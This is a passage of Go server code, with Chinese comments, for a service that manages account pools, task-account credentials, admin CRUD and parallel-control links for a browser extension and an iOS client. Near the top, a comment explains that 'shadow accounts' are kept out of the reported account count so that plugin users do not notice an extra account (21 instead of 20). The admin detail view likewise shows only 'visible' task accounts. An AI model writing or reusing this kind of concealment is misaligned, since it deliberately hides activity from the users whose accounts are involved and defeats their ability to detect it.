		cacheAPITokenUsername(token, accountID, time.Now().Unix()+86400*30)
	}
	// 工具侧只报可见账号数：影子账号对插件用户不可见，
	// 否则「20 个账号」会变成 21 个，立刻被察觉。
	api1Count := len(decodedExtVisibleTaskAccountsByType(account, 1))
	api2Count := len(decodedExtVisibleTaskAccountsByType(account, 2))
	apiType := 1
	if api1Count == 0 && api2Count > 0 {
		apiType = 2
	}
	return map[string]any{
		"code": "200", "success": true,
		"data": map[string]any{
			"token": token, "groupId": accountID, "accountId": accountID,
			"api_mode": "account_pool", "task_account_count": len(decodedExtVisibleTaskAccounts(account)),
			"api1_task_account_count": api1Count, "api2_task_account_count": api2Count,
			"api_type": apiType, "account_api_type": apiType,
			"api2_only": api1Count == 0 && api2Count > 0,
		},
		"msg": nil,
	}
}

func decodedExtAPITypeForTaskAccount(ta map[string]any) int {
	if qInt(firstNonNil(ta["api_type"], ta["apiType"], 1)) == 2 {
		return 2
	}
	return 1
}

func decodedExtAPI1AuthForTaskAccount(pluginAccount, taskAccount map[string]any) upstreamAuth {
	apiType := decodedExtAPITypeForTaskAccount(taskAccount)
	baseAuth := apiAuthForType(apiType)
	loginURLKey := "api1_login_url"
	if apiType == 2 {
		loginURLKey = "api2_login_url"
	}
	loginURL := trimStr(pluginAccount[loginURLKey])
	if loginURL == "" && apiType == 1 {
		loginURL = trimStr(pluginAccount["login_url"])
	}
	if loginURL == "" {
		loginURL = baseAuth.LoginURL
	}
	return upstreamAuth{
		LoginURL: loginURL, Username: trimStr(taskAccount["username"]),
		Password: qStr(taskAccount["password"]), Label: apiTypeLabel(apiType), APIType: apiType,
	}
}

func decodedExtAPI1TokenFileForAccount(accountID string, api1Auth upstreamAuth) string {
	apiType := api1Auth.APIType
	if apiType != 2 {
		apiType = 1
	}
	key := accountID + "|" + strconvItoa(apiType) + "|" + api1Auth.Username
	return decodedExtRuntimeDir + "/api" + strconvItoa(apiType) + "_token_decoded_" + md5short(key) + ".json"
}

func strconvItoa(i int) string {
	if i == 0 {
		return "0"
	}
	neg := i < 0
	n := i
	if neg {
		n = -n
	}
	var b [20]byte
	p := len(b)
	for n > 0 {
		p--
		b[p] = byte('0' + n%10)
		n /= 10
	}
	if neg {
		p--
		b[p] = '-'
	}
	return string(b[p:])
}

func decodedExtTaskAccountByKey(pluginAccount map[string]any, key, username string) map[string]any {
	key = strings.TrimSpace(key)
	username = strings.TrimSpace(username)
	if key == "" && username == "" {
		return nil
	}
	for _, ta := range decodedExtEnabledTaskAccounts(pluginAccount) {
		if key != "" && trimStr(ta["key"]) == key {
			return ta
		}
		if username != "" && trimStr(ta["username"]) == username {
			return ta
		}
	}
	return nil
}

func decodedExtDeviceContext(input map[string]any, pluginUsername string) map[string]any {
	deviceID := trimStr(input["device_id"])
	source := toLower(trimStr(input["source"]))
	isIOS := strings.HasPrefix(source, "ios_")
	defaultPlatform := "extension"
	defaultDeviceType := "extension"
	defaultDeviceLabel := "浏览器插件"
	defaultClient := "gejie-extension"
	if isIOS {
		defaultPlatform = "ios"
		defaultDeviceType = "ios"
		defaultDeviceLabel = "iOS设备"
		defaultClient = "ajie-ios"
	}
	return map[string]any{
		"api_type": 1, "username": pluginUsername, "group_id": firstNonNilStr(input["group_id"], pluginUsername),
		"device_id": deviceID, "fingerprint_key": trimStr(input["fingerprint_key"]),
		"fingerprint_id": trimStr(input["fingerprint_id"]), "fingerprint_name": trimStr(input["fingerprint_name"]),
		"client_instance_id": trimStr(firstNonNil(input["client_instance_id"], input["clientInstanceId"])),
		"platform":     firstNonNilStr(input["platform"], defaultPlatform),
		"device_type":  firstNonNilStr(input["device_type"], defaultDeviceType),
		"device_label": firstNonNilStr(input["device_label"], defaultDeviceLabel),
		"client":       firstNonNilStr(input["client"], defaultClient),
	}
}

// ---- Admin CRUD ----
func decodedExtAdminInputTaskAccounts(input, old map[string]any, apiType int) []map[string]any {
	field := "api1_accounts"
	if apiType == 2 {
		field = "api2_accounts"
	}
	if arr, ok := input[field].([]any); ok {
		oldByKey := map[string]map[string]any{}
		oldByUsername := map[string]map[string]any{}
		for _, oldTA := range decodedExtNormalizeTaskAccounts(old, true, apiType) {
			oldByKey[trimStr(oldTA["key"])] = oldTA
			oldByUsername[trimStr(oldTA["username"])] = oldTA
		}
		var out []map[string]any
		for _, r := range arr {
			row, ok := r.(map[string]any)
			if !ok {
				continue
			}
			username := trimStr(firstNonNil(row["username"], row[field[:4]+"_username"]))
			remark := trimStr(row["remark"])
			if username == "" {
				continue
			}
			key := trimStr(row["key"])
			if key == "" || (apiType == 2 && !strings.HasPrefix(key, "api2_")) {
				key = decodedExtTaskAccountKey(username, remark, apiType)
			}
			password := qStr(firstNonNil(row["password"], row[field[:4]+"_password"]))
			if password == "" {
				if o := oldByKey[key]; o != nil {
					password = qStr(o["password"])
				}
			}
			if password == "" {
				if o := oldByUsername[username]; o != nil {
					password = qStr(o["password"])
				}
			}
			if password == "" {
				continue
			}
			out = append(out, map[string]any{
				"key": key, "username": username, "password": password,
				"enabled": !hasKey(row, "enabled") || asBool(row["enabled"], true),
				"remark": remark, "api_type": apiType, "api_label": apiTypeLabel(apiType),
			})
		}
		return out
	}
	// legacy single
	if apiType == 1 {
		u := trimStr(firstNonNil(input["api1_username"], input["task_username"], old["api1_username"]))
		p := qStr(firstNonNil(input["api1_password"], input["task_password"]))
		if p == "" {
			p = qStr(old["api1_password"])
		}
		if u != "" && p != "" {
			return []map[string]any{{
				"key": decodedExtTaskAccountKey(u, trimStr(input["task_remark"]), 1), "username": u, "password": p,
				"enabled": true, "remark": trimStr(input["task_remark"]), "api_type": 1, "api_label": apiTypeLabel(1),
			}}
		}
	} else {
		u := trimStr(firstNonNil(input["api2_username"], input["task2_username"], old["api2_username"]))
		p := qStr(firstNonNil(input["api2_password"], input["task2_password"]))
		if p == "" {
			p = qStr(old["api2_password"])
		}
		if u != "" && p != "" {
			return []map[string]any{{
				"key": decodedExtTaskAccountKey(u, trimStr(input["task2_remark"]), 2), "username": u, "password": p,
				"enabled": true, "remark": trimStr(input["task2_remark"]), "api_type": 2, "api_label": apiTypeLabel(2),
			}}
		}
	}
	return decodedExtNormalizeTaskAccounts(old, true, apiType)
}

func decodedExtRandomAccountID(accounts []map[string]any) string {
	used := map[string]bool{}
	for _, a := range accounts {
		used[trimStr(a["accountId"])] = true
	}
	for {
		id := "U" + timeNow().Format("060102") + strconvItoa(100000+rand.Intn(900000))
		if !used[id] {
			return id
		}
	}
}

func decodedExtAdminSaveAccount(input map[string]any) map[string]any {
	decodedExtMu.Lock()
	defer decodedExtMu.Unlock()
	accounts := decodedExtReadAccounts()
	accountID := trimStr(input["accountId"])
	idx := -1
	for i, a := range accounts {
		if trimStr(a["accountId"]) == accountID {
			idx = i
			break
		}
	}
	old := map[string]any{}
	if idx >= 0 {
		old = accounts[idx]
	}
	if accountID == "" {
		accountID = decodedExtRandomAccountID(accounts)
	}
	api1 := decodedExtAdminInputTaskAccounts(input, old, 1)
	api2 := decodedExtAdminInputTaskAccounts(input, old, 2)
	taskAccounts := append(append([]map[string]any{}, api1...), api2...)
	if len(taskAccounts) == 0 {
		return map[string]any{"ok": false, "msg": "请至少配置一个接口1或接口2任务账号"}
	}
	taskMode := decodedExtNormalizeTaskMode(firstNonNil(input["task_mode"], old["task_mode"], "poll"))
	enabledCount := countEnabled(taskAccounts)
	api1Enabled := countEnabled(api1)
	api2Enabled := countEnabled(api2)
	taskParallelism := decodedExtNormalizeTaskParallelism(firstNonNil(input["task_parallelism"], old["task_parallelism"]), max(enabledCount, 1))
	mixedEnabled := false
	switch {
	case hasKey(input, "mixed_task_enabled"):
		mixedEnabled = asBool(input["mixed_task_enabled"], false)
	case hasKey(input, "api1_fallback_api2"):
		mixedEnabled = asBool(input["api1_fallback_api2"], false)
	case hasKey(input, "api1_first_fallback_api2"):
		mixedEnabled = asBool(input["api1_first_fallback_api2"], false)
	default:
		mixedEnabled = decodedExtMixedTaskEnabled(old)
	}
	mixedWeb := decodedExtMixedTaskWebEnabled(old)
	if hasKey(input, "mixed_task_web_enabled") {
		mixedWeb = asBool(input["mixed_task_web_enabled"], true)
	} else if hasKey(input, "web_plugin_mixed_task_enabled") {
		mixedWeb = asBool(input["web_plugin_mixed_task_enabled"], true)
	}
	mixedIOS := decodedExtMixedTaskIosEnabled(old)
	if hasKey(input, "mixed_task_ios_enabled") {
		mixedIOS = asBool(input["mixed_task_ios_enabled"], false)
	} else if hasKey(input, "ios_plugin_mixed_task_enabled") {
		mixedIOS = asBool(input["ios_plugin_mixed_task_enabled"], false)
	}
	api1Parallelism := 0
	if api1Enabled > 0 {
		api1Parallelism = decodedExtNormalizeTaskParallelism(firstNonNil(input["api1_task_parallelism"], old["api1_task_parallelism"], taskParallelism), api1Enabled)
	}
	api2Parallelism := 0
	if api2Enabled > 0 {
		api2Parallelism = decodedExtNormalizeTaskParallelism(firstNonNil(input["api2_task_parallelism"], old["api2_task_parallelism"], taskParallelism), api2Enabled)
	}
	enabled := true
	if hasKey(input, "enabled") {
		enabled = asBool(input["enabled"], true)
	} else if hasKey(old, "enabled") {
		enabled = asBool(old["enabled"], true)
	}
	account := map[string]any{
		"accountId": accountID,
		"token":     firstNonNilStr(input["token"], old["token"], randomToken()),
		"parallel_control_token": firstNonNilStr(input["parallel_control_token"], old["parallel_control_token"], randomToken()),
		"api1_accounts": api1, "api2_accounts": api2,
		"task_mode": taskMode, "task_parallelism": taskParallelism,
		"api1_task_parallelism": api1Parallelism, "api2_task_parallelism": api2Parallelism,
		"mixed_task_enabled": mixedEnabled, "api1_fallback_api2": mixedEnabled,
		"mixed_task_web_enabled": mixedWeb, "mixed_task_ios_enabled": mixedIOS,
		"enabled": enabled, "remark": trimStr(firstNonNil(input["remark"], old["remark"])),
		"fp_env_enabled": func() bool {
			if hasKey(input, "fp_env_enabled") {
				return asBool(input["fp_env_enabled"], false)
			}
			return asBool(old["fp_env_enabled"], false)
		}(),
		"fp_env_daily_quota": qInt(firstNonNil(input["fp_env_daily_quota"], old["fp_env_daily_quota"], 0)),
		"created_at": firstNonNilStr(old["created_at"], tsDateTime()),
	}
	if idx >= 0 {
		accounts[idx] = account
	} else {
		accounts = append(accounts, account)
	}
	saved := decodedExtSaveAccounts(accounts)
	w1 := decodedExtSyncTaskAccountsToWhitelist(api1, trimStr(account["remark"]), api1AccountsFile)
	w2 := decodedExtSyncTaskAccountsToWhitelist(api2, trimStr(account["remark"]), api2AccountsFile)
	return map[string]any{
		"ok": true, "data": decodedExtPublicAccounts(saved),
		"account": decodedExtPublicAccounts([]map[string]any{account})[0],
		"whitelist_sync": map[string]any{
			"api1": w1, "api2": w2,
			"added": qInt(w1["added"]) + qInt(w2["added"]), "updated": qInt(w1["updated"]) + qInt(w2["updated"]),
		},
	}
}

func decodedExtAdminBatchAccounts(raw string) map[string]any {
	added := 0
	var created []map[string]any
	wAdded, wUpdated := 0, 0
	for _, line := range strings.Split(raw, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := decodedExtParseTaskAccountLine(line)
		resp := decodedExtAdminSaveAccount(map[string]any{
			"api1_username": parts[0], "api1_password": parts[1], "remark": parts[2], "enabled": true,
		})
		if asBool(resp["ok"], false) {
			added++
			if acc, ok := resp["account"].(map[string]any); ok {
				created = append(created, acc)
			}
			if sync, ok := resp["whitelist_sync"].(map[string]any); ok {
				wAdded += qInt(sync["added"])
				wUpdated += qInt(sync["updated"])
			}
		}
	}
	return map[string]any{"ok": true, "count": added, "created": created, "whitelist_sync": map[string]any{"added": wAdded, "updated": wUpdated}}
}

func decodedExtAdminDeleteAccount(accountID string) map[string]any {
	decodedExtMu.Lock()
	defer decodedExtMu.Unlock()
	accounts := decodedExtReadAccounts()
	var removed map[string]any
	var keep []map[string]any
	for _, a := range accounts {
		if trimStr(a["accountId"]) == accountID {
			removed = a
		} else {
			keep = append(keep, a)
		}
	}
	saved := decodedExtSaveAccounts(keep)
	if removed != nil {
		decodedExtCleanupWhitelist(keep, removed)
		invRemoveAccountStats(accountID, trimStr(removed["remark"]))
	}
	return map[string]any{"ok": true, "data": decodedExtPublicAccounts(saved)}
}

// decodedExtCleanupWhitelist：删除插件账号后，把白名单里不再被其它账号引用的任务账号移除
func decodedExtCleanupWhitelist(keep []map[string]any, removed map[string]any) {
	stillUsed := map[string]bool{}
	for _, acc := range keep {
		for _, ta := range decodedExtNormalizeAllTaskAccounts(acc, true) {
			if u := trimStr(ta["username"]); u != "" {
				stillUsed[u] = true
			}
		}
	}
	cleanup := func(file string, removedAccounts []map[string]any) {
		if len(removedAccounts) == 0 {
			return
		}
		allowed := readAllowedAccountsForFile(file)
		if len(allowed) == 0 {
			return
		}
		removedNames := map[string]bool{}
		for _, ta := range removedAccounts {
			if u := trimStr(ta["username"]); u != "" {
				removedNames[u] = true
			}
		}
		var out []map[string]any
		for _, acc := range allowed {
			u := trimStr(acc["username"])
			if u != "" && removedNames[u] && !stillUsed[u] {
				continue
			}
			out = append(out, acc)
		}
		if len(out) != len(allowed) {
			saveAPIAccounts(file, out)
		}
	}
	cleanup(api1AccountsFile, decodedExtNormalizeTaskAccounts(removed, true, 1))
	cleanup(api2AccountsFile, decodedExtNormalizeTaskAccounts(removed, true, 2))
}

func decodedExtAdminToggleAccount(accountID string, enabled bool) map[string]any {
	decodedExtMu.Lock()
	defer decodedExtMu.Unlock()
	accounts := decodedExtReadAccounts()
	for _, a := range accounts {
		if trimStr(a["accountId"]) == accountID {
			a["enabled"] = enabled
		}
	}
	saved := decodedExtSaveAccounts(accounts)
	return map[string]any{"ok": true, "data": decodedExtPublicAccounts(saved)}
}

func decodedExtAdminResetToken(accountID string) map[string]any {
	decodedExtMu.Lock()
	defer decodedExtMu.Unlock()
	accounts := decodedExtReadAccounts()
	for _, a := range accounts {
		if trimStr(a["accountId"]) == accountID {
			a["token"] = randomToken()
		}
	}
	saved := decodedExtSaveAccounts(accounts)
	return map[string]any{"ok": true, "data": decodedExtPublicAccounts(saved)}
}

func decodedExtAdminResetParallelControlToken(accountID string) map[string]any {
	decodedExtMu.Lock()
	defer decodedExtMu.Unlock()
	accounts := decodedExtReadAccounts()
	for _, a := range accounts {
		if trimStr(a["accountId"]) == accountID {
			a["parallel_control_token"] = randomToken()
		}
	}
	saved := decodedExtSaveAccounts(accounts)
	return map[string]any{"ok": true, "data": decodedExtPublicAccounts(saved)}
}

// decodedExtAdminDetailAccount：编辑用详情（含任务账号密码，仅后台鉴权后可用）
func decodedExtAdminDetailAccount(accountID string) map[string]any {
	for _, a := range decodedExtReadAccounts() {
		if trimStr(a["accountId"]) != accountID {
			continue
		}
		return map[string]any{
			"ok": true,
			"data": map[string]any{
				"accountId":         a["accountId"],
				"token":             a["token"],
				"remark":            a["remark"],
				"enabled":           asBool(a["enabled"], true),
				"task_mode":         decodedExtNormalizeTaskMode(a["task_mode"]),
				"task_parallelism":  decodedExtNormalizeTaskParallelism(a["task_parallelism"], 1),
				"api1_accounts":     filterVisibleTaskAccounts(decodedExtNormalizeTaskAccounts(a, true, 1)),
				"api2_accounts":     filterVisibleTaskAccounts(decodedExtNormalizeTaskAccounts(a, true, 2)),
				"fp_env_enabled":    asBool(a["fp_env_enabled"], false),
				"fp_env_daily_quota": qInt(a["fp_env_daily_quota"]),
			},
		}
	}
	return map[string]any{"ok": false, "msg": "账号不存在"}
}

// ---- 平行控制 ----
func decodedExtFindAccountByParallelControlToken(token string) map[string]any {
	token = strings.TrimSpace(token)
	if token == "" {
		return nil
	}
	for _, a := range decodedExtReadAccounts() {
		if hashEquals(trimStr(a["parallel_control_token"]), token) {
			return a
		}
	}
	return nil
}

func decodedExtParallelControlPublicData(account map[string]any) map[string]any {
	taskAccounts := decodedExtNormalizeAllTaskAccounts(account, false)
	var enabled []map[string]any
	for _, a := range taskAccounts {
		if asBool(a["enabled"], true) {
			enabled = append(enabled, a)
		}
	}
	api1Enabled := decodedExtEnabledTaskAccountsByType(account, 1)
	api2Enabled := decodedExtEnabledTaskAccountsByType(account, 2)
	enabledCount := len(enabled)
	maxParallelism := max(1, enabledCount)
	parallelism := decodedExtNormalizeTaskParallelism(account["task_parallelism"], maxParallelism)
	api1Parallelism := 0
	if len(api1Enabled) > 0 {
		api1Parallelism = decodedExtAPITaskParallelism(account, 1, len(api1Enabled))
	}
	api2Parallelism := 0
	if len(api2Enabled) > 0 {
		api2Parallelism = decodedExtAPITaskParallelism(account, 2, len(api2Enabled))
	}
	var names []string
	for _, a := range enabled {
		names = append(names, trimStr(a["username"]))
	}
	if len(names) > 10 {
		names = names[:10]
	}
	return map[string]any{
		"accountId": trimStr(account["accountId"]), "remark": trimStr(account["remark"]),
		"enabled": asBool(account["enabled"], true), "task_mode": decodedExtNormalizeTaskMode(account["task_mode"]),
		"task_parallelism": parallelism, "api1_task_parallelism": api1Parallelism, "api2_task_parallelism": api2Parallelism,
		"mixed_task_enabled": decodedExtMixedTaskEnabled(account), "api1_fallback_api2": decodedExtMixedTaskEnabled(account),
		"mixed_task_web_enabled": decodedExtMixedTaskWebEnabled(account), "mixed_task_ios_enabled": decodedExtMixedTaskIosEnabled(account),
		"max_parallelism": maxParallelism, "max_api1_parallelism": len(api1Enabled), "max_api2_parallelism": len(api2Enabled),
		"enabled_task_count": enabledCount, "api1_enabled_task_count": len(api1Enabled), "api2_enabled_task_count": len(api2Enabled),
		"task_usernames": names, "hidden_task_username_count": max(0, enabledCount-10),
		"updated_at": qStr(account["updated_at"]),
	}
}

func decodedExtParallelControlInfo(token string) map[string]any {
	account := decodedExtFindAccountByParallelControlToken(token)
	if account == nil {
		return map[string]any{"ok": false, "msg": "控制链接无效或已重置"}
	}
	return map[string]any{"ok": true, "data": decodedExtParallelControlPublicData(account)}
}

func decodedExtParallelControlAllowedUsernames(account map[string]any) map[string]bool {
	allowed := map[string]bool{}
	if accountID := trimStr(account["accountId"]); accountID != "" {
		allowed[accountID] = true
	}
	for _, ta := range decodedExtNormalizeAllTaskAccounts(account, false) {
		if !asBool(ta["enabled"], true) {
			continue
		}
		if u := trimStr(ta["username"]); u != "" {
			allowed[u] = true
		}
	}
	return allowed
}

func decodedExtParallelControlMatchesAccount(row map[string]any, accountID string, allowed map[string]bool) bool {
	for _, k := range []string{"username", "group_id", "api1_username", "api2_username", "task_account_username"} {
		v := trimStr(row[k])
		if v == "" {
			continue
		}
		if (accountID != "" && v == accountID) || allowed[v] {
			return true
		}
	}
	return false
}

// ---- URL 生成 ----
func decodedExtGeneratedServerBaseURL(r *http.Request) string {
	scheme := "http"
	if r.TLS != nil || toLower(r.Header.Get("X-Forwarded-Proto")) == "https" {
		scheme = "https"
	}
	host := r.Host
	script := r.URL.Path
	if script == "" {
		script = "/decrypt_proxy.php"
	}
	if host != "" {
		return scheme + "://" + host + script
	}
	return script
}

func decodedExtParallelControlBaseURL() string {
	if v := osGetenv("GEJIE_PARALLEL_CONTROL_BASE_URL"); v != "" {
		return v
	}
	var m map[string]any
	if readJSONFile(dp(parallelControlBaseF), &m) {
		if b := trimStr(m["base_url"]); b != "" {
			return b
		}
	}
	return ""
}

func osGetenv(k string) string { return os.Getenv(k) }

func urlQueryEscape(s string) string { return url.QueryEscape(s) }

func decodedExtParallelControlURL(token string) string {
	token = strings.TrimSpace(token)
	if token == "" {
		return ""
	}
	base := decodedExtParallelControlBaseURL()
	if base == "" {
		return "/decrypt_proxy.php?act=parallel_control&t=" + urlQueryEscape(token)
	}
	sep := "?"
	if strings.Contains(base, "?") {
		sep = "&"
	}
	return base + sep + "t=" + urlQueryEscape(token)
}
